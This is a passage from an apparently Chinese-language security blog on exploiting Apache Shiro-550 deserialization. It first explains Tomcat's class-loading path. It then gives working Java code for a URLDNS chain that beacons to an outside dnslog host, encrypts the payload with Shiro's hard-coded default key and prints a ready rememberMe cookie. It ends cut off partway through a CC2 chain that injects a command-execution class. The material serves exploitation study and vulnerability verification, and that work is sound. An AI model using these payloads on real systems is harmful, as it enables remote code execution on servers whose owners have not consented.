class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 加载指定名称的类，并根据需要解析该类。</span><br><span class="hljs-comment">     * 此方法会尝试从多个位置加载类，包括缓存、J2SE 类加载器、父类加载器和本地仓库。</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">public</span> Class&lt;?&gt; loadClass(String name, <span class="hljs-type">boolean</span> resolve) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>    <span class="hljs-comment">// 获取类加载锁并进行同步，确保线程安全</span><br>    <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>.getClassLoadingLockInternal(name)) &#123;<br>        <span class="hljs-comment">// 标记是否委托给父类加载器加载类，一般为false</span><br>        <span class="hljs-type">boolean</span> delegateLoad;<br>        <span class="hljs-comment">// 标签用于跳出多层嵌套的代码块</span><br>        label220: &#123;<br>            <span class="hljs-comment">// 如果调试日志启用，记录加载类的信息</span><br>            <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                log.debug(<span class="hljs-string">&quot;loadClass(&quot;</span> + name + <span class="hljs-string">&quot;, &quot;</span> + resolve + <span class="hljs-string">&quot;)&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-comment">// 用于存储加载的类对象</span><br>            Class&lt;?&gt; clazz = <span class="hljs-literal">null</span>;<br>            <span class="hljs-comment">// 检查类加载器是否已停止</span><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.started) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-comment">// 若已停止，抛出 IllegalStateException</span><br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>();<br>                &#125; <span class="hljs-keyword">catch</span> (IllegalStateException e) &#123;<br>                    <span class="hljs-comment">// 记录类加载器已停止的日志</span><br>                    log.info(sm.getString(<span class="hljs-string">&quot;webappClassLoader.stopped&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;name&#125;), e);<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">// 尝试从自定义的缓存中查找已加载的类</span><br>            clazz = <span class="hljs-built_in">this</span>.findLoadedClass0(name);<br>            <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">// 如果在缓存中找到类，记录日志</span><br>                <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                    log.debug(<span class="hljs-string">&quot;  Returning class from cache&quot;</span>);<br>                &#125;<br>                <span class="hljs-comment">// 如果需要解析类，则解析该类</span><br>                <span class="hljs-keyword">if</span> (resolve) &#123;<br>                    <span class="hljs-built_in">this</span>.resolveClass(clazz);<br>                &#125;<br>                <span class="hljs-keyword">return</span> clazz;<br>            &#125;<br><br>            <span class="hljs-comment">// 尝试从 Java 标准的缓存中查找已加载的类</span><br>            clazz = <span class="hljs-built_in">this</span>.findLoadedClass(name);<br>            <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">// 如果在缓存中找到类，记录日志</span><br>                <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                    log.debug(<span class="hljs-string">&quot;  Returning class from cache&quot;</span>);<br>                &#125;<br>                <span class="hljs-comment">// 如果需要解析类，则解析该类</span><br>                <span class="hljs-keyword">if</span> (resolve) &#123;<br>                    <span class="hljs-built_in">this</span>.resolveClass(clazz);<br>                &#125;<br>                <span class="hljs-keyword">return</span> clazz;<br>            &#125;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// 尝试使用 J2SE 类加载器加载类</span><br>                clazz = <span class="hljs-built_in">this</span>.j2seClassLoader.loadClass(name);<br>                <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-comment">// 如果需要解析类，则解析该类</span><br>                    <span class="hljs-keyword">if</span> (resolve) &#123;<br>                        <span class="hljs-built_in">this</span>.resolveClass(clazz);<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> clazz;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var11) &#123;<br>                <span class="hljs-comment">// 忽略类未找到异常，继续尝试其他加载方式</span><br>            &#125;<br><br>            <span class="hljs-comment">// 如果安全管理器存在</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.securityManager != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">// 此处存在逻辑错误，原代码想获取包名索引，应改为 name.lastIndexOf(&#x27;.&#x27;)</span><br>                delegateLoad = name.lastIndexOf(<span class="hljs-string">&#x27;.&#x27;</span>) &gt;= <span class="hljs-number">0</span>; <br>                <span class="hljs-keyword">if</span> (delegateLoad) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-comment">// 检查是否有权限访问该包</span><br>                        <span class="hljs-built_in">this</span>.securityManager.checkPackageAccess(name.substring(<span class="hljs-number">0</span>, name.lastIndexOf(<span class="hljs-string">&#x27;.&#x27;</span>)));<br>                    &#125; <span class="hljs-keyword">catch</span> (SecurityException var9) &#123;<br>                        <span class="hljs-comment">// 记录安全违规日志</span><br>                        <span class="hljs-type">String</span> <span class="hljs-variable">error</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Security Violation, attempt to use Restricted Class: &quot;</span> + name;<br>                        <span class="hljs-keyword">if</span> (name.endsWith(<span class="hljs-string">&quot;BeanInfo&quot;</span>)) &#123;<br>                            log.debug(error, var9);<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            log.info(error, var9);<br>                        &#125;<br>                        <span class="hljs-comment">// 抛出类未找到异常</span><br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassNotFoundException</span>(error, var9);<br>                    &#125;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">// 判断是否委托给父类加载器加载类</span><br>            delegateLoad = <span class="hljs-built_in">this</span>.delegate || <span class="hljs-built_in">this</span>.filter(name);<br>            <span class="hljs-keyword">if</span> (delegateLoad) &#123;<br>                <span class="hljs-comment">// 如果需要委托，记录日志</span><br>                <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                    log.debug(<span class="hljs-string">&quot;  Delegating to parent classloader1 &quot;</span> + <span class="hljs-built_in">this</span>.parent);<br>                &#125;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-comment">// 尝试使用父类加载器加载类</span><br>                    clazz = Class.forName(name, <span class="hljs-literal">false</span>, <span class="hljs-built_in">this</span>.parent);<br>                    <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-comment">// 如果加载成功，记录日志</span><br>                        <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                            log.debug(<span class="hljs-string">&quot;  Loading class from parent&quot;</span>);<br>                        &#125;<br>                        <span class="hljs-comment">// 如果需要解析类，则解析该类</span><br>                        <span class="hljs-keyword">if</span> (resolve) &#123;<br>                            <span class="hljs-built_in">this</span>.resolveClass(clazz);<br>                        &#125;<br>                        <span class="hljs-keyword">return</span> clazz;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var12) &#123;<br>                    <span class="hljs-comment">// 忽略类未找到异常，继续尝试其他加载方式</span><br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">// 如果调试日志启用，记录开始在本地仓库搜索类的信息</span><br>            <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                log.debug(<span class="hljs-string">&quot;  Searching local repositories&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// 尝试从本地仓库查找并加载类</span><br>                clazz = <span class="hljs-built_in">this</span>.findClass(name);<br>                <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-comment">// 如果未找到类，跳出标签标记的代码块</span><br>                    <span class="hljs-keyword">break</span> label220;<br>                &#125;<br>                <span class="hljs-comment">// 如果加载成功，记录日志</span><br>                <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                    log.debug(<span class="hljs-string">&quot;  Loading class from local repository&quot;</span>);<br>                &#125;<br>                <span class="hljs-comment">// 如果需要解析类，则解析该类</span><br>                <span class="hljs-keyword">if</span> (resolve) &#123;<br>                    <span class="hljs-built_in">this</span>.resolveClass(clazz);<br>                &#125;<br>                <span class="hljs-keyword">return</span> clazz;<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var13) &#123;<br>                <span class="hljs-comment">// 忽略类未找到异常，跳出标签标记的代码块</span><br>                <span class="hljs-keyword">break</span> label220;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 如果没有委托给父类加载器加载类</span><br>        <span class="hljs-keyword">if</span> (!delegateLoad) &#123;<br>            <span class="hljs-comment">// 如果调试日志启用，记录最后委托给父类加载器加载类的信息</span><br>            <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                log.debug(<span class="hljs-string">&quot;  Delegating to parent classloader at end: &quot;</span> + <span class="hljs-built_in">this</span>.parent);<br>            &#125;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// 尝试使用父类加载器加载类</span><br>                Class&lt;?&gt; var21 = Class.forName(name, <span class="hljs-literal">false</span>, <span class="hljs-built_in">this</span>.parent);<br>                <span class="hljs-keyword">if</span> (var21 == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-comment">// 如果未找到类，抛出类未找到异常</span><br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassNotFoundException</span>(name);<br>                &#125;<br>                <span class="hljs-comment">// 如果加载成功，记录日志</span><br>                <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>                    log.debug(<span class="hljs-string">&quot;  Loading class from parent&quot;</span>);<br>                &#125;<br>                <span class="hljs-comment">// 如果需要解析类，则解析该类</span><br>                <span class="hljs-keyword">if</span> (resolve) &#123;<br>                    <span class="hljs-built_in">this</span>.resolveClass(var21);<br>                &#125;<br>                <span class="hljs-keyword">return</span> var21;<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var14) &#123;<br>                <span class="hljs-comment">// 抛出类未找到异常</span><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassNotFoundException</span>(name);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 如果所有尝试都失败，抛出类未找到异常</span><br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassNotFoundException</span>(name);<br>&#125;<br></code></pre></td></tr></table></figure><p>主要的类加载方法</p><ol><li>clazz &#x3D; this.findLoadedClass0(name);</li><li>clazz &#x3D; this.findLoadedClass(name);</li><li>clazz &#x3D; this.j2seClassLoader.loadClass(name);</li><li>clazz &#x3D; Class.forName(name, false, this.parent); 当 delegateLoad 为 true 或者 false 都会经过这个 forName</li><li>clazz &#x3D; this.findClass(name);</li></ol><p>而数组类型缓存和类加载器无法加载，就会进入  Class.forName 方法传入 this.parent 向上委托</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250420133400523.png" alt="image-20250420133400523"></p><p>这里的加载流程为</p><p>加载核心类时：java.lang.String</p><ul><li><code>URLClassLoader</code> <strong>首先将请求委托给它的父加载器</strong>。<code>URLClassLoader</code> 的父加载器通常是扩展类加载器 (ExtClassLoader)</li><li>扩展类加载器再将请求委托给它的父加载器，也就是 <strong>引导类加载器 (Bootstrap ClassLoader)</strong>。</li><li><strong>引导类加载器</strong> 在其负责的路径（如 <code>rt.jar</code> 或 JRE 核心模块）中查找 。它 <strong>能够找到并加载</strong> 核心 Java 类。如 int String 等</li><li><strong>获取元素类型</strong>: 由于委托链成功地让引导类加载器加载了 <code>java.lang.String</code>，<code>this.parent</code> (URLClassLoader) 最终能够获取到 <code>java.lang.String</code> 的 <code>Class</code> 对象。</li><li><strong>数组类创建</strong>: 因为元素类型 <code>java.lang.String</code> 的 <code>Class</code> 对象已成功加载（并且其定义类加载器是 Bootstrap ClassLoader），JVM 现在可以动态地创建 <code>String[]</code> 的 <code>Class</code> 对象。<strong>数组类的定义加载器与其元素类型的定义加载器相同</strong>。因此，<code>String[]</code> 的定义加载器也是 Bootstrap ClassLoader。</li><li><strong>返回结果</strong>: <code>Class.forName</code> 成功返回 <code>String[]</code> 的 <code>Class</code> 对象。</li></ul><p>而加载外部类时：Transformer</p><ul><li><code>URLClassLoader</code> 将请求委托给它的父加载器 (ExtClassLoader)。</li><li>Ext Loader 委托给 Bootstrap Loader。</li><li><strong>Bootstrap Loader 找不到 <code>Transformer</code></strong> (它不是核心 JRE 类)。</li><li><strong>Platform&#x2F;Ext Loader 找不到 <code>Transformer</code></strong> (它不在扩展目录或平台模块中)。</li><li>请求回到 <code>this.parent</code> (URLClassLoader)。它会 <strong>搜索自己配置的 URLs</strong> ( Tomcat 的 <code>shared/lib</code> 或 <code>common/lib</code> 目录)。</li><li>而 <code>Transformer</code> 位于 <code>WEB-INF/classes</code> 或 <code>WEB-INF/lib</code> 中，<strong>这些路径通常不包含在父加载器 (<code>this.parent</code>) 的搜索路径中</strong>。因此，<code>this.parent</code> 也找不到 <code>Transformer</code>。</li></ul><p>看到 URLClassLoader 的路径主要就是 tomcat 的 lib 包目录</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250420134054839.png" alt="image-20250420134054839"></p><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p>这应该是最常用的漏洞验证的链了，jdk 自身的发送 http 请求的链条</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://x8o4kd.dnslog.cn&quot;</span>);<br>        <span class="hljs-comment">// 反射修改hashCode值，避免本地发送请求</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> uri.getClass().getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(uri, <span class="hljs-number">1</span>);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(uri, <span class="hljs-string">&quot;lingx5&quot;</span>);<br>        field.set(uri,-<span class="hljs-number">1</span>); <span class="hljs-comment">// 还原hashCode值</span><br>        <span class="hljs-comment">// 序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(hashMap);<br>        oos.close();<br>        <span class="hljs-type">byte</span>[] URLbytes = barr.toByteArray();<br>        <span class="hljs-comment">// AES加密</span><br>        <span class="hljs-type">byte</span>[] encryptKey = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(encryptKey, <span class="hljs-string">&quot;AES&quot;</span>);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>);<br>        <span class="hljs-comment">// 生成一个固定的 IV（实际应用中建议随机生成并随密文一起传输）</span><br>        <span class="hljs-type">byte</span>[] iv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">ivSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(iv);<br>        cipher.init(Cipher.ENCRYPT_MODE, key, ivSpec);<br>        <span class="hljs-type">byte</span>[] encryptedBytes = cipher.doFinal(URLbytes);<br>        <span class="hljs-comment">// 合并 IV 和密文</span><br>        <span class="hljs-type">byte</span>[] newBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[iv.length + encryptedBytes.length];<br>        System.arraycopy(iv, <span class="hljs-number">0</span>, newBytes, <span class="hljs-number">0</span>, iv.length);<br>        System.arraycopy(encryptedBytes, <span class="hljs-number">0</span>, newBytes, iv.length, encryptedBytes.length);<br>        <span class="hljs-comment">// Base64编码</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">encodedString</span> <span class="hljs-operator">=</span> Base64.encodeToString(newBytes);<br>        System.out.println(encodedString);<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 模拟Shiro解密过程进行验证</span><br><span class="hljs-comment">         * */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">        // Base64解码</span><br><span class="hljs-comment">        byte[] decode = Base64.decode(encodedString);</span><br><span class="hljs-comment">        // 分割 IV 和密文</span><br><span class="hljs-comment">        byte[] deIv = new byte[16];</span><br><span class="hljs-comment">        byte[] enBytes = new byte[decode.length - deIv.length];</span><br><span class="hljs-comment">        System.arraycopy(decode,0,deIv,0,deIv.length);</span><br><span class="hljs-comment">        System.arraycopy(decode,deIv.length,enBytes,0,enBytes.length);</span><br><span class="hljs-comment">        IvParameterSpec deIvSpace = new IvParameterSpec(deIv);</span><br><span class="hljs-comment">        cipher.init(Cipher.DECRYPT_MODE, key, deIvSpace);</span><br><span class="hljs-comment">        byte[] decryptedBytes = cipher.doFinal(enBytes);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        // 反序列化验证</span><br><span class="hljs-comment">        ByteArrayInputStream bais = new ByteArrayInputStream(decryptedBytes);</span><br><span class="hljs-comment">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="hljs-comment">        ois.readObject();</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> */</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">AAAAAAAAAAAAAAAAAAAAAItICRDL55PQ4M+uF<span class="hljs-regexp">/0QjIxmsxx8mwO0zL+cCUsm9HObVST6ifzXbe1pfVhnBOcNB/</span>avKvCNhZKKEkw8li0SSbf62ZGen2JxK9GPNTlXi10BYih5NVjk4ocW4ENUi6hZlSxiNlyC3Q25XwIhMON<span class="hljs-regexp">/uw7crTuwACWmWE0jIdPOYyABOdZJA9nlewAZpTrmEaHbZYQB5KVDpRXP2yqBkbTvjNUfIvwEuX60rpPKt7e8sEjSxFlwSCz3FKopCi3NiM3aeeXV8drr/</span>SI0NQCbrCDgntbel3wZLXU0pMelccjtIQfq7JmBPs81MT3PR1GKNd5UWi8ESuneT6fkFK6FRu6pqfCmF9hYZMfctiA1v8GUGxpI<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250421105715521.png" alt="image-20250421105715521"></p><h3 id="CC2payload"><a href="#CC2payload" class="headerlink" title="CC2payload"></a>CC2payload</h3><p>CC2 可以攻击的是 <code>commons-collections4</code> </p><p>需要 shiro 环境有 commons-collections4 依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shiro550CC2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-type">byte</span>[] getEvil()&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span>  <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span> ctClass.makeClass(<span class="hljs-string">&quot;evil&quot;</span>);<br>            evil.setSuperclass(ctClass.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));<br>            evil.makeClassInitializer().insertBefore(cmd);<br>            <span class="hljs-type">byte</span>[] bytes = evil.toBytecode();<br>            <span class="hljs-keyword">return</span> bytes;<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; clazz = obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span 